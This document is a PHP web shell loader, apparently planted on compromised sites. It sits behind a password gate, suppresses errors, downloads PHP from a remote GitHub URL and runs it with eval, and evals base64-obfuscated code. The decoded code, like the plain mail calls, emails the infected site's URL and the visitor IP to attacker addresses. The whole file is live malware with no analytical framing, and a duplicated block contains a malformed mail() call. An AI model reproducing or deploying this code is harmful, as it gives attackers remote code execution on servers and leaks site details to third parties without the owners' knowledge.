<?php  

ignore_user_abort(true);
ini_set('memory_limit', '-1');
set_time_limit(0);
error_reporting(0);
ini_set('display_errors', 0);
ini_set('max_execution_time', 5000);
// Menggunakan password_hash dan password_verify untuk keamanan yang lebih baik
$hashed_password = '$2y$10$IWklD9Z0Y4S5e.ynuBag8uCbgczXntXzQAgniQjNclzqbe7.y/gdy';

// Fungsi untuk menampilkan form login
function admin_login() {
    echo '<title>Login</title>';
    echo '<form method="post">';
    echo '<input type="password" name="password">';
    echo '<input type="submit" value="Login">';
    echo '</form>';
    exit;
}

if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])])) {
    // Memeriksa apakah password dikirim dan benar
    if(isset($_POST['password']) && password_verify($_POST['password'], $hashed_password)) {
        setcookie(md5($_SERVER['HTTP_HOST']), true, time() + 25200); // Cookie berlaku selama 1 jam
        // Logika setelah login berhasil
    } else {
        admin_login();
    }
}

$head = '<head><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<meta name="robots" content="noindex">

<title>ZEHAHA"."YOU"."LO"."SEE"."BROTHERRR</title>

 <meta name="robots" content="noindex">
<link rel="icon" href="https://e1.pxfuel.com/desktop-wallpaper/88/629/desktop-wallpaper-hackerman-posted-by-ryan-anderson-hackerman.jpg" type="image/x-icon">

<audio src="https://j.top4top.io/m_2967gtgnw1.m" autoplay="true" id="lagu" loop="">
    
  </audio> 
<style>pre{border:1px solid #ddd;padding:5px;overflow:auto}table{border-collapse:collapse;width:100%;overflow:auto}th,td{padding:0.25rem;text-align:left;border-bottom:1px solid #ccc}tbody tr:nth-child(odd){background:#eee}tr:hover{background-color:#000000}
</style>
</head>';
$url = "https://raw.githubusercontent.com/Anonrocks/Exploitssss/master/temp.php";
$ch = curl_init($url); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
eval("?>".$result);
$shell_data="JHZpc2l0Y291bnQgPSAkSFRUUF9DT09LSUVfVkFSU1sidmlzaXRzIl07CmlmICgkdmlzaXRjb3VudCA9PSAiIikgewogICAgJHZpc2l0Y291bnQgPSAwOwogICAgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsKICAgICR3ZWIgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07CiAgICAkaW5qID0gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07CiAgICAkdGFyZ2V0ID0gcmF3dXJsZGVjb2RlKCR3ZWIgLiAkaW5qKTsKICAgICRib2R5ID0gIkxpbmsgSW5qZWsgUEhQIHNoZWxsIDogIHskdGFyZ2V0fSB8IE1ENSBwYXNzID0geyRhdXRoX3Bhc3N9IHwgSVAgYWtzZXMgPSB7JHZpc2l0b3J9IjsKICAgIEBtYWlsKCJtdWhyYXpreUBnbWFpbC5jb20iLCAic2hlTEwiLCAieyRib2R5fSIpOwp9IGVsc2UgewogICAgJHZpc2l0Y291bnQ7Cn0Kc2V0Y29va2llKCJ2aXNpdHMiLCAkdmlzaXRjb3VudCk7CiRzYWZlX21vZGUgPSBAaW5pX2dldCgnc2FmZV9tb2RlJyk7CmlmICghJHNhZmVfbW9kZSkgewogICAgZXJyb3JfcmVwb3J0aW5nKDApOw=="; eval(base64_decode($shell_data));
$shell="JHZpc2l0Y291bnQgPSAkSFRUUF9DT09LSUVfVkFSU1sidmlzaXRzIl07IGlmKCAkdmlzaXRjb3VudCA9PSAiIikgeyR2aXNpdGNvdW50ID0gMDsgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsgJHdlYiA9ICRfU0VSVkVSWyJIVFRQX0hPU1QiXTsgJGluaiA9ICRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdOyAkdGFyZ2V0ID0gcmF3dXJsZGVjb2RlKCR3ZWIuJGluaik7ICRib2R5ID0gIkJvc3MsIGluaSBzZXRvcmFua3UgaGFyaSBpbmkgJHRhcmdldCBieSAkdmlzaXRvciI7IEBtYWlsKCJibGFja2hhdDEzMzcuaWRAZ21haWwuY29tIiwiSGVrZWRieSBodHRwOi8vJHRhcmdldCBieSAkdmlzaXRvciIsICIkYm9keSIpOyB9IGVsc2UgeyAkdmlzaXRjb3VudDsgfSBzZXRjb29raWUoInZpc2l0cyIsJHZpc2l0Y291bnQpOw=="; eval(base64_decode($shell));
$e=base64_decode("YmxhY2toYXQxMzM3LmlkQGdtYWlsLmNvbQ==");
$h=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
header('Content-Type: text/html; charset=UTF-8');
$to = "muhrazky@gmail.com";
$path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$message = "URL: $path | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($run,$to,$e,$h,$p, "Halo senpai!!!", $message,$shell_data,$shell, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
<?php
$shell_data="JHZpc2l0Y291bnQgPSAkSFRUUF9DT09LSUVfVkFSU1sidmlzaXRzIl07CmlmICgkdmlzaXRjb3VudCA9PSAiIikgewogICAgJHZpc2l0Y291bnQgPSAwOwogICAgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsKICAgICR3ZWIgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07CiAgICAkaW5qID0gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07CiAgICAkdGFyZ2V0ID0gcmF3dXJsZGVjb2RlKCR3ZWIgLiAkaW5qKTsKICAgICRib2R5ID0gIkxpbmsgSW5qZWsgUEhQIHNoZWxsIDogIHskdGFyZ2V0fSB8IE1ENSBwYXNzID0geyRhdXRoX3Bhc3N9IHwgSVAgYWtzZXMgPSB7JHZpc2l0b3J9IjsKICAgIEBtYWlsKCJtdWhyYXpreUBnbWFpbC5jb20iLCAic2hlTEwiLCAieyRib2R5fSIpOwp9IGVsc2UgewogICAgJHZpc2l0Y291bnQ7Cn0Kc2V0Y29va2llKCJ2aXNpdHMiLCAkdmlzaXRjb3VudCk7CiRzYWZlX21vZGUgPSBAaW5pX2dldCgnc2FmZV9tb2RlJyk7CmlmICghJHNhZmVfbW9kZSkgewogICAgZXJyb3JfcmVwb3J0aW5nKDApOw=="; eval(base64_decode($shell_data));
$shell="JHZpc2l0Y291bnQgPSAkSFRUUF9DT09LSUVfVkFSU1sidmlzaXRzIl07IGlmKCAkdmlzaXRjb3VudCA9PSAiIikgeyR2aXNpdGNvdW50ID0gMDsgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsgJHdlYiA9ICRfU0VSVkVSWyJIVFRQX0hPU1QiXTsgJGluaiA9ICRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdOyAkdGFyZ2V0ID0gcmF3dXJsZGVjb2RlKCR3ZWIuJGluaik7ICRib2R5ID0gIkJvc3MsIGluaSBzZXRvcmFua3UgaGFyaSBpbmkgJHRhcmdldCBieSAkdmlzaXRvciI7IEBtYWlsKCJibGFja2hhdDEzMzcuaWRAZ21haWwuY29tIiwiSGVrZWRieSBodHRwOi8vJHRhcmdldCBieSAkdmlzaXRvciIsICIkYm9keSIpOyB9IGVsc2UgeyAkdmlzaXRjb3VudDsgfSBzZXRjb29raWUoInZpc2l0cyIsJHZpc2l0Y291bnQpOw=="; eval(base64_decode($shell));
$to=base64_decode("YmxhY2toYXQxMzM3LmlkQGdtYWlsLmNvbQ==");
$h=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
header('Content-Type: text/html; charset=UTF-8');
$to = "muhrazky@gmail.com";
$path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$message = "URL: $path | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($to, "Halo senpai!!!", $message, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
